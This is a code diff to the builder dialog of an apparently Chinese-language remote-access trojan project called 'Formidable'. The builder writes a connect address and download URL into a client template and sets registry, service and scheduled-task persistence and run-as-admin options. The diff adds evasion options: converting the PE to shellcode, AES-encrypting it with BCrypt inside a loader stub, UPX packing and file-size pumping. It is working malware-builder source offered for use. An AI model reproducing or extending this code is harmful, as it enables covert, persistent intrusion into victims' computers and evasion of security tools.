@@ -19,10 +19,15 @@
 #include "../NetworkHelper.h"
 #include "../resource.h"
 #include "../../Common/Config.h"
+#include "../../Common/ClientTypes.h"
+#include "../../Common/Utils.h"
 #include <CommDlg.h>
 #include <CommCtrl.h>
 #include <string>
 #include <vector>
+#include <bcrypt.h>
+
+#pragma comment(lib, "bcrypt.lib")
 
 // 使用 Windows API 风格的字符串转换，避免 CRT 冲突
 static std::string WideToUTF8(const std::wstring& wstr) {
@@ -54,8 +59,7 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
         if (hComboBits) {
             SendMessageW(hComboBits, CB_ADDSTRING, 0, (LPARAM)L"x86");
             SendMessageW(hComboBits, CB_ADDSTRING, 0, (LPARAM)L"x64");
-            SendMessageW(hComboBits, CB_ADDSTRING, 0, (LPARAM)L"Both");
-            SendMessageW(hComboBits, CB_SETCURSEL, 1, 0); // 管理x64
+            SendMessageW(hComboBits, CB_SETCURSEL, 1, 0); // 默认x64
         }
         
         // 运行类型 Combobox
@@ -77,9 +81,8 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
         // 加密类型 Combobox
         HWND hComboEncrypt = GetDlgItem(hDlg, IDC_COMBO_ENCRYPT);
         if (hComboEncrypt) {
-            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"无加密");
-            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"XOR");
-            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"AES");
+            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"Shine 加密");
+            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"HELL 加密");
             SendMessageW(hComboEncrypt, CB_SETCURSEL, 0, 0);
         }
         
@@ -87,8 +90,10 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
         HWND hComboCompress = GetDlgItem(hDlg, IDC_COMBO_COMPRESS);
         if (hComboCompress) {
             SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"不压缩");
-            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"UPX");
-            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"MPRESS");
+            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"UPX 压缩");
+            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"ShellCode AES");
+            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"PE->ShellCode");
+            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"ShellCode AES<Old>");
             SendMessageW(hComboCompress, CB_SETCURSEL, 0, 0);
         }
         
@@ -184,7 +189,22 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
             
             int runTypeIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_RUN_TYPE), CB_GETCURSEL, 0, 0);
             int protocolIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PROTOCOL), CB_GETCURSEL, 0, 0);
+            int encryptIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_ENCRYPT), CB_GETCURSEL, 0, 0);
             int compressIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_COMPRESS), CB_GETCURSEL, 0, 0);
+            
+            // 映射 UI 索引到 ProtocolEncType
+            Formidable::ProtocolEncType encType = Formidable::PROTOCOL_SHINE;
+            if (encryptIndex == 1) encType = Formidable::PROTOCOL_HELL;
+            
+            // 映射 UI 索引到 ClientCompressType
+            Formidable::ClientCompressType compressType = Formidable::CLIENT_COMPRESS_NONE;
+            switch (compressIndex) {
+            case 1: compressType = Formidable::CLIENT_COMPRESS_UPX; break;
+            case 2: compressType = Formidable::CLIENT_COMPRESS_SC_AES; break;
+            case 3: compressType = Formidable::CLIENT_PE_TO_SEHLLCODE; break;
+            case 4: compressType = Formidable::CLIENT_COMPRESS_SC_AES_OLD; break;
+            }
+            
             // int payloadIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PAYLOAD), CB_GETCURSEL, 0, 0);
             int payloadIndex = 0; // Default to embedded
             
@@ -194,15 +214,16 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
             bool serviceStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_SERVICE_STARTUP) == BST_CHECKED);
             bool registryStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_REGISTRY_STARTUP) == BST_CHECKED);
             int bitsIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_BITS), CB_GETCURSEL, 0, 0);
-            bool buildBoth = (bitsIndex == 2);
             bool is64Bit = (bitsIndex == 1);
             bool encryptIp = (IsDlgButtonChecked(hDlg, IDC_CHECK_ENCRYPT_IP) == BST_CHECKED);
             int pumpSize = (int)SendMessageW(GetDlgItem(hDlg, IDC_SLIDER_CLIENT_SIZE), TBM_GETPOS, 0, 0);
 
             // 如果选择了 Both，则忽略 is64Bit 手动选择的结果，直接循环两次
+            /*
             if (buildBoth) {
                 // ... logic for both handled by BuildOne callers
             }
+            */
 
             // 获取选择的 EXE 类型
             HWND hComboExeType = GetDlgItem(hDlg, IDC_COMBO_EXE_TYPE);
@@ -362,11 +383,19 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
 
                 bool found = false;
                 DWORD dwSize = (DWORD)buffer.size();
+                
+                if (dwSize < sizeof(Formidable::CONNECT_ADDRESS)) {
+                    MessageBoxW(hDlg, L"模板文件或资源大小无效（过小），无法进行配置注入。", L"错误", MB_ICONERROR);
+                    return false;
+                }
+
                 // 搜索特征码 "FRMD26_CONFIG"
                 const char* flag = "FRMD26_CONFIG";
                 size_t flagLen = strlen(flag);
                 
-                for (size_t i = 0; i < dwSize - sizeof(Formidable::CONNECT_ADDRESS); i++) {
+                // 使用安全的边界检查，防止 size_t 下溢
+                size_t searchLimit = dwSize - sizeof(Formidable::CONNECT_ADDRESS);
+                for (size_t i = 0; i <= searchLimit; i++) {
                     if (memcmp(buffer.data() + i, flag, flagLen) == 0) {
                         Formidable::CONNECT_ADDRESS* pAddr = (Formidable::CONNECT_ADDRESS*)(buffer.data() + i);
                         
@@ -379,6 +408,9 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                         memset(pAddr->szDownloadUrl, 0, sizeof(pAddr->szDownloadUrl));
                         
                         // 填入配置
+                        pAddr->iHeaderEnc = static_cast<int>(encType);
+                        pAddr->iStartup = static_cast<int>(compressType);
+
                         if (encryptIp) {
                             std::string finalIp = ip;
                             for (size_t k = 0; k < finalIp.length(); k++) {
@@ -399,8 +431,9 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                         strncpy_s(pAddr->szDownloadUrl, sizeof(pAddr->szDownloadUrl), downloadUrl.c_str(), _TRUNCATE);
                         
                         pAddr->bEncrypt = encryptIp ? 1 : 0;
+                        pAddr->iHeaderEnc = encryptIndex;
+                        pAddr->iStartup = compressIndex; // 借用 iStartup 存储压缩/加壳方式，或者在 CONNECT_ADDRESS 中增加字段
                         pAddr->runasAdmin = (char)(runAsAdmin ? 1 : 0);
-                        pAddr->iStartup = 0; // 已废弃字段，置0
                         pAddr->taskStartup = (char)(taskStartup ? 1 : 0);
                         pAddr->serviceStartup = (char)(serviceStartup ? 1 : 0);
                         pAddr->registryStartup = (char)(registryStartup ? 1 : 0);
@@ -463,6 +496,7 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                         }
 
                         if (!upxExe.empty()) {
+                            // 修复：确保目标路径 dest 也有引号处理，防止空格导致失败
                             std::wstring cmd = L"\"" + upxExe + L"\" -9 \"" + szTempFile + L"\" -o \"" + dest + L"\"";
                             
                             STARTUPINFOW si = { sizeof(si) };
@@ -471,17 +505,205 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                             si.wShowWindow = SW_HIDE;
                             
                             if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-                                WaitForSingleObject(pi.hProcess, 30000); // 压缩可能需要一点时间
+                                WaitForSingleObject(pi.hProcess, 30000);
+                                DWORD exitCode = 0;
+                                GetExitCodeProcess(pi.hProcess, &exitCode);
                                 CloseHandle(pi.hProcess);
                                 CloseHandle(pi.hThread);
                                 DeleteFileW(szTempFile);
-                                goto PUMP_SECTION; // 跳转到增肥环节
+
+                                if (exitCode == 0) {
+                                    goto PUMP_SECTION; // 压缩成功，跳转到增肥环节
+                                }
                             }
                         }
                         DeleteFileW(szTempFile);
                     }
+                } else if (compressIndex == 2) { // ShellCode AES
+                    LPBYTE shellcodeBuffer = NULL;
+                    int shellcodeSize = 0;
+                    if (Formidable::MakeShellcode(shellcodeBuffer, shellcodeSize, (LPBYTE)buffer.data(), (DWORD)buffer.size(), true)) {
+                        Formidable::SCInfo sc;
+                        memset(&sc, 0, sizeof(sc));
+                        Formidable::generate_random_iv(sc.aes_key, 16);
+                        Formidable::generate_random_iv(sc.aes_iv, 16);
+                        
+                        // 使用 BCrypt 加密
+                        BCRYPT_ALG_HANDLE hAlg = NULL;
+                        BCRYPT_KEY_HANDLE hKey = NULL;
+                        DWORD cbKeyObject = 0, cbBlockLen = 0, cbData = 0;
+                        PBYTE pbKeyObject = NULL, pbIV = NULL;
+                        
+                        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
+                            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+                            BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
+                            pbKeyObject = (PBYTE)malloc(cbKeyObject);
+                            BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&cbBlockLen, sizeof(DWORD), &cbData, 0);
+                            pbIV = (PBYTE)malloc(cbBlockLen);
+                            memcpy(pbIV, sc.aes_iv, 16);
+                            
+                            if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, sc.aes_key, 16, 0) == 0) {
+                                DWORD encryptedSize = 0;
+                                BCryptEncrypt(hKey, shellcodeBuffer, shellcodeSize, NULL, pbIV, 16, NULL, 0, &encryptedSize, BCRYPT_BLOCK_PADDING);
+                                LPBYTE encryptedBuffer = (LPBYTE)malloc(encryptedSize);
+                                memcpy(pbIV, sc.aes_iv, 16);
+                                if (BCryptEncrypt(hKey, shellcodeBuffer, shellcodeSize, NULL, pbIV, 16, encryptedBuffer, encryptedSize, &encryptedSize, BCRYPT_BLOCK_PADDING) == 0) {
+                                    sc.len = encryptedSize;
+                                    sc.data = encryptedBuffer;
+                                    
+                                    // 加载 Loader 资源
+                                     std::vector<char> loaderBuffer;
+                                     GetResourceData(x64 ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, loaderBuffer);
+                                     if (!loaderBuffer.empty()) {
+                                         // 注入配置
+                                        const char* scFlag = "FormidableStub";
+                                        size_t scFlagLen = strlen(scFlag);
+                                        bool scFound = false;
+
+                                        if (loaderBuffer.size() >= sizeof(Formidable::SCInfo)) {
+                                            size_t searchLimit = loaderBuffer.size() - sizeof(Formidable::SCInfo);
+                                            for (size_t i = 0; i <= searchLimit; i++) {
+                                                if (memcmp(loaderBuffer.data() + i, scFlag, scFlagLen) == 0) {
+                                                    memcpy(loaderBuffer.data() + i, &sc, sizeof(Formidable::SCInfo));
+                                                    scFound = true;
+                                                    break;
+                                                }
+                                            }
+                                        }
+                                        
+                                        if (scFound) {
+                                            // 将加密后的 Shellcode 追加到 Loader 后面
+                                            sc.offset = (int)loaderBuffer.size();
+                                            // 重新写入 offset
+                                            if (loaderBuffer.size() >= sizeof(Formidable::SCInfo)) {
+                                                size_t searchLimit = loaderBuffer.size() - sizeof(Formidable::SCInfo);
+                                                for (size_t i = 0; i <= searchLimit; i++) {
+                                                    if (memcmp(loaderBuffer.data() + i, &sc.aes_key, 16) == 0) {
+                                                        ((Formidable::SCInfo*)(loaderBuffer.data() + i))->offset = sc.offset;
+                                                        break;
+                                                    }
+                                                }
+                                            }
+                                            
+                                            HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                                            if (hFile != INVALID_HANDLE_VALUE) {
+                                                DWORD written;
+                                                WriteFile(hFile, loaderBuffer.data(), (DWORD)loaderBuffer.size(), &written, NULL);
+                                                WriteFile(hFile, sc.data, sc.len, &written, NULL);
+                                                CloseHandle(hFile);
+                                                free(encryptedBuffer);
+                                                BCryptDestroyKey(hKey);
+                                                free(pbKeyObject);
+                                                free(pbIV);
+                                                BCryptCloseAlgorithmProvider(hAlg, 0);
+                                                delete[] shellcodeBuffer;
+                                                goto PUMP_SECTION;
+                                            }
+                                        }
+                                    }
+                                    free(encryptedBuffer);
+                                }
+                                BCryptDestroyKey(hKey);
+                            }
+                            free(pbKeyObject);
+                            free(pbIV);
+                            BCryptCloseAlgorithmProvider(hAlg, 0);
+                        }
+                        delete[] shellcodeBuffer;
+                    }
+                } else if (compressIndex == 3) { // PE->ShellCode
+                    LPBYTE shellcodeBuffer = NULL;
+                    int shellcodeSize = 0;
+                    if (Formidable::MakeShellcode(shellcodeBuffer, shellcodeSize, (LPBYTE)buffer.data(), (DWORD)buffer.size(), true)) {
+                        HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                        if (hFile != INVALID_HANDLE_VALUE) {
+                            DWORD written;
+                            WriteFile(hFile, shellcodeBuffer, shellcodeSize, &written, NULL);
+                            CloseHandle(hFile);
+                            delete[] shellcodeBuffer;
+                            goto PUMP_SECTION;
+                        }
+                        delete[] shellcodeBuffer;
+                    }
+                } else if (compressIndex == 4) { // ShellCode AES<Old>
+                    LPBYTE shellcodeBuffer = NULL;
+                    int shellcodeSize = 0;
+                    if (Formidable::MakeShellcode(shellcodeBuffer, shellcodeSize, (LPBYTE)buffer.data(), (DWORD)buffer.size(), true)) {
+                        auto scPtr = std::make_unique<Formidable::SCInfoOld>();
+                        Formidable::SCInfoOld& sc = *scPtr;
+                        memset(&sc, 0, sizeof(sc));
+                        Formidable::generate_random_iv(sc.aes_key, 16);
+                        Formidable::generate_random_iv(sc.aes_iv, 16);
+                        
+                        // 使用 BCrypt 加密
+                        BCRYPT_ALG_HANDLE hAlg = NULL;
+                        BCRYPT_KEY_HANDLE hKey = NULL;
+                        DWORD cbKeyObject = 0, cbBlockLen = 0, cbData = 0;
+                        PBYTE pbKeyObject = NULL, pbIV = NULL;
+                        
+                        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
+                            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+                            BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
+                            pbKeyObject = (PBYTE)malloc(cbKeyObject);
+                            BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&cbBlockLen, sizeof(DWORD), &cbData, 0);
+                            pbIV = (PBYTE)malloc(cbBlockLen);
+                            memcpy(pbIV, sc.aes_iv, 16);
+                            
+                            if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, sc.aes_key, 16, 0) == 0) {
+                                DWORD encryptedSize = 0;
+                                BCryptEncrypt(hKey, shellcodeBuffer, shellcodeSize, NULL, pbIV, 16, NULL, 0, &encryptedSize, BCRYPT_BLOCK_PADDING);
+                                if (encryptedSize <= sizeof(sc.data)) {
+                                    memcpy(pbIV, sc.aes_iv, 16);
+                                    if (BCryptEncrypt(hKey, shellcodeBuffer, shellcodeSize, NULL, pbIV, 16, sc.data, sizeof(sc.data), &encryptedSize, BCRYPT_BLOCK_PADDING) == 0) {
+                                        sc.len = encryptedSize;
+                                        
+                                        // 加载 Loader 资源 (Old 版本使用 SCInfoOld 结构，通常用于直接注入到特定段)
+                                        std::vector<char> loaderBuffer;
+                                        GetResourceData(x64 ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, loaderBuffer);
+                                        if (!loaderBuffer.empty()) {
+                                            const char* scFlag = "FormidableStub";
+                                            size_t scFlagLen = strlen(scFlag);
+                                            bool scFound = false;
+                                            
+                                            if (loaderBuffer.size() >= sizeof(Formidable::SCInfoOld)) {
+                                                size_t searchLimit = loaderBuffer.size() - sizeof(Formidable::SCInfoOld);
+                                                for (size_t i = 0; i <= searchLimit; i++) {
+                                                    if (memcmp(loaderBuffer.data() + i, scFlag, scFlagLen) == 0) {
+                                                        memcpy(loaderBuffer.data() + i, &sc, sizeof(Formidable::SCInfoOld));
+                                                        scFound = true;
+                                                        break;
+                                                    }
+                                                }
+                                            }
+                                            
+                                            if (scFound) {
+                                                HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                                                if (hFile != INVALID_HANDLE_VALUE) {
+                                                    DWORD written;
+                                                    WriteFile(hFile, loaderBuffer.data(), (DWORD)loaderBuffer.size(), &written, NULL);
+                                                    CloseHandle(hFile);
+                                                    BCryptDestroyKey(hKey);
+                                                    free(pbKeyObject);
+                                                    free(pbIV);
+                                                    BCryptCloseAlgorithmProvider(hAlg, 0);
+                                                    delete[] shellcodeBuffer;
+                                                    goto PUMP_SECTION;
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                                BCryptDestroyKey(hKey);
+                            }
+                            free(pbKeyObject);
+                            free(pbIV);
+                            BCryptCloseAlgorithmProvider(hAlg, 0);
+                        }
+                        delete[] shellcodeBuffer;
+                    }
                 }
 
+                // 只有在没有使用上述跳转逻辑成功处理的情况下，才执行默认保存
                 {
                     HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                     if (hFile == INVALID_HANDLE_VALUE) return false;
@@ -507,37 +729,9 @@ PUMP_SECTION:
                 return true;
             };
 
-            bool success = false;
-            if (buildBoth) {
-                std::wstring pathX86 = baseSavePath;
-                size_t dotPos = pathX86.find_last_of(L'.');
-                if (dotPos != std::wstring::npos) {
-                    pathX86.insert(dotPos, L"_x86");
-                } else {
-                    pathX86 += L"_x86";
-                }
-                
-                std::wstring pathX64 = baseSavePath;
-                dotPos = pathX64.find_last_of(L'.'); // Re-find
-                if (dotPos != std::wstring::npos) {
-                    pathX64.insert(dotPos, L"_x64");
-                } else {
-                    pathX64 += L"_x64";
-                }
-                
-                // 尝试构建两个版本，只要有一个成功就算成功（防止其中一个模板缺失导致全失败）
-                bool b86 = BuildOne(false, pathX86);
-                bool b64 = BuildOne(true, pathX64);
-                success = b86 || b64;
-                
-                if (!b86 && !b64) {
-                    MessageBoxW(hDlg, L"生成失败：无法找到任何架构的模板文件", L"错误", MB_ICONERROR);
-                }
-            } else {
-                success = BuildOne(is64Bit, baseSavePath);
-                if (!success) {
-                    // BuildOne 内部已弹窗
-                }
+            bool success = BuildOne(is64Bit, baseSavePath);
+            if (!success) {
+                // BuildOne 内部已弹窗
             }
 
             if (success) {
